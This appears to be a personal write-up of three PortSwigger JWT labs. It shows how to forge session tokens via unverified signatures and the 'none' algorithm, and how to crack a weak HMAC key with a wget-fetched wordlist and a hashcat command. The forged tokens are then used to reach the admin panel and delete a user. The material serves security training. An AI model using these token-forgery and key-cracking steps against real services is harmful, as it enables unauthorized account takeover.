
# Lab 1

## Description

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`


## Solution

Use `JWT Web Token` extension. Send `GET /login` request to repeater and go to `JSON Web Token` tab. The following is listed inside payload:

```
{  
    "iss": "portswigger",  
    "exp": 1764918118,  
    "sub": "wiener"  
}
```

change `wiener` to `administrator`:

```
{  
    "iss": "portswigger",  
    "exp": 1764918118,  
    "sub": "administrator"  
}
```

then hit send, follow redirect and search for `panel` in response. This finds a link to `/admin` -> follow it -> search for delete -> copy link and make a GET request to `/admin/delete?username=carlos` which solves the lab.


# Lab 2

## Description

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

As the description suggests, send request to repeater and head to `JSON Web Token` tab, then click on `Attack` button and take the option `"none" Signing Algorithm`. Then change `sub` value from `wiener` to `administrator` and send the request. Follow the redirect as before and send a GET request to `/admin/delete?username=carlos` which solves the lab.


# Lab 3

## Description

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a [wordlist of common secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

#### Tip

We recommend familiarizing yourself with [how to work with JWTs in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/jwts) before attempting this lab.

We also recommend using hashcat to brute-force the secret key. For details on how to do this, see [Brute forcing secret keys using hashcat](https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat).


## Solution

Taking the JWT-key and as suggested download the list:

```
wget "https://github.com/wallarm/jwt-secrets/raw/refs/heads/master/jwt.secrets.list"
```

Then use following hashcat command to brute force the secret:

```
hashcat -a 0 -m 16500 eyJraWQiOiIyZjZiNDc3YS1jNGUzLTRkM2QtYjA0MS0wODY3NzUwZmY3OTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTUwMDM4Niwic3ViIjoid2llbmVyIn0.jApa6SwGZqtiFddF6Ed05kbs5wT5NCZG-4LJmjSLf1I jwt.secrets.list
```

which returns:

```
hashcat -a 0 -m 16500 eyJraWQiOiIyZjZiNDc3YS1jNGUzLTRkM2QtYjA0MS0wODY3NzUwZmY3OTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTUwMDM4Niwic3ViIjoid2llbmVyIn0.jApa6SwGZqtiFddF6Ed05kbs5wT5NCZG-4LJmjSLf1I jwt.secrets.list --show
eyJraWQiOiIyZjZiNDc3YS1jNGUzLTRkM2QtYjA0MS0wODY3NzUwZmY3OTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MTUwMDM4Niwic3ViIjoid2llbmVyIn0.jApa6SwGZqtiFddF6Ed05kbs5wT5NCZG-4LJmjSLf1I:secret1
```

Going back to the website adn navigating to `/admin` shows:

```
401
```

sending the GET request to repeater and opening JWT Token tab. Head to `JWT Editor` tab, hit `New symmetric Key` and input the password to `secret1` (verify the base64 value corresponds to the password). Generate and save. Now change `sub` value to `administrator`, hit `sign` and resend the request. 

The server returns:

```
200 OK
```

Navigating to:

```
/admin/delete?username=carlos
```

which deletes the user `carlos` and solves the lab.

